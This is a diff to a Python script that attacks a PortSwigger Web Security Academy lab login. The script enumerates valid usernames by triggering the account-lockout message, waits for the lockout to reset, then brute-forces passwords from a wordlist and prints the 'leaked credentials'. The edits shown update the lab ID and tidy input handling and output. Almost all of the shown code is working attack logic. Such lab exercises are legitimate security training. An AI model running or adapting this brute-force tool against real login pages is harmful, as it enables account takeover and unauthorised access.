@@ -24,7 +24,7 @@ app = typer.Typer()
 
 @app.command()
 def run():
-    lab_id= '0a08005303bd0e7681caa7e70044009e'
+    lab_id= '0a5a00b2045cf11f801899d3006700f6'
     possible_usernames = []
 
     valid_username_string = 'You have made too many incorrect login attempts.'
@@ -43,16 +43,18 @@ def run():
         with Progress() as progress:
             task = progress.add_task("Usernames fuzzing...", total=file_length*5) 
             for username in file_lines:
+                
                 print(username)
         
                 if not username:
                     break
+                username=username.strip()
                 
                 for i in range(0,5):
                     #print(f'{username}, {i}')
                     response = requests.post(
                                             f"https://{lab_id}.web-security-academy.net/login", data= {
-                                                "username" : username.strip(),
+                                                "username" : username,
                                                 "password": password
                                             }, headers={
                                                 "host": f"{lab_id}.web-security-academy.net",
@@ -69,10 +71,11 @@ def run():
                     #print(response_text)
                     #print(f'{response.elapsed.total_seconds()}: {username}')
                     if valid_username_string in response_text:
-                        console.print(f'\n username found: {username}', style="warning")
+                        console.print(f'\nusername found', style="warning")
+                        console.print(f'{username}',style='danger')
                         #progress.update(task, advance=file_length*6)
                         #print(i)
-                        possible_usernames.append(username.strip())
+                        possible_usernames.append(username)
                         #break   
 
                 
@@ -83,7 +86,7 @@ def run():
                 
             
     
-    console.print(f'\n Candidate usernames: {possible_usernames}', style="info")
+    console.print(f'\nCandidate usernames: {possible_usernames}', style="info")
 
     console.print('Wait for 60s to reset user account...', style="danger")
     time.sleep(60)
@@ -104,6 +107,7 @@ def run():
                 attempt_limit = 4
                 count=0
                 for password in file_lines:
+                    password=password.strip()
                     #print(password)
             
                    
@@ -117,8 +121,8 @@ def run():
                     # `password.strip()`.
                     response = requests.post(
                                             f"https://{lab_id}.web-security-academy.net/login", data= {
-                                                "username" : username.strip(),
-                                                "password": password.strip()
+                                                "username" : username,
+                                                "password": password
                                             }, headers={
                                                 "host": f"{lab_id}.web-security-academy.net",
                                                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
@@ -134,7 +138,8 @@ def run():
                         count=0
                 # print(response.text)
                     if logged_in_string in response_text:
-                        console.print(f'\n Leaked credentials {username.strip()}:{password.strip()}', style="info")
+                        console.print(f'\nLeaked credentials',style='warning')
+                        console.print(f'{username}:{password}', style="info")
                         progress.update(task, advance=file_length*5)
                         break
                         #user_found=True
